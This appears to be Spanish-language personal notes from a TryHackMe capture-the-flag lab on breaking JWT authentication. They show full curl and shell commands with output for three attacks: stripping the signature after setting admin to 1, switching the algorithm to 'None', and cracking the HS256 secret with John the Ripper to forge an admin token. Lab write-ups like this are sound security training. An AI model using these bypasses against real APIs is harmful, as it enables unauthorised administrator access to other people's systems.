ejemplo obtencion de token
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password3" }' http://10.201.43.102/api/v1.0/example3
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"
}



1.- modificar seccion payload del token y retirando signature
	$ echo "eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0" | base64 -d    
		{"username":"user","admin":0}                                                                                                                                                                                                                                            
	┌──(kali㉿Kali)-[~]
	└─$ echo '{"username":"manolo","admin":1}' | base64                                              
		eyJ1c2VybmFtZSI6Im1hbm9sbyIsImFkbWluIjoxfQo=
	
	curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hbm9sbyIsImFkbWluIjoxfQo.' http://10.201.43.102/api/v1.0/example2?username=admin 
	{
		  "message": "Welcome admin, you are an admin, here is your flag: THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}"
	}

2.- modificando seccion header, cambiando algoritmo y payload a admin
	$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d      
	{"typ":"JWT","alg":"HS256"}                                                                                                                                                                                                                                            
	┌──(kali㉿Kali)-[~]
	└─$ echo '{"typ":"JWT","alg":"None"}' | base64        
	eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0K
	
	 ┌──(kali㉿Kali)-[~]
	└─$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0K.eyJ1c2VybmFtZSI6Im1hbm9sbyIsImFkbWluIjoxfQo._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8' http://10.201.43.102/api/v1.0/example3?username=admin
	{
	  "message": "Welcome admin, you are an admin, here is your flag: THM{fb9341e4-5823-475f-ae50-4f9a1a4489ba}"
	}

3.- crackear la clave de generación del token (llave privada) y regenerar token valido personalizado
	$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password4" }' http://10.201.43.102/api/v1.0/example4                                                                   
	{
	  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY"
	}  
	┌──(kali㉿Kali)-[~]
	└─$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY" > jwt.txt
	─$ john jwt.txt
	Proceeding with wordlist:/usr/share/john/password.lst
	secret           (?) 
	
	https://www.jwt.io/sitio -> para generación de token pasando llave 
	
	$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.gpHtgNe4OSgiQHuf8W7JFfSNTi9tEnDKvK7QAk2DFBc' http://10.201.43.102/api/v1.0/example4?username=admin
	{
	  "message": "Welcome admin, you are an admin, here is your flag: THM{e1679fef-df56-41cc-85e9-af1e0e12981b}"
	}
